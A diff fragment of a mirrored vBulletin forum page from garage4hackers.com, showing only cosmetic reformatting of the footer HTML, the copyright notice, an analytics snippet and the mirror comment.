-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:48 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:48 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -339,7 +336,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6883&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:48 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6883&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:48 GMT --></html>
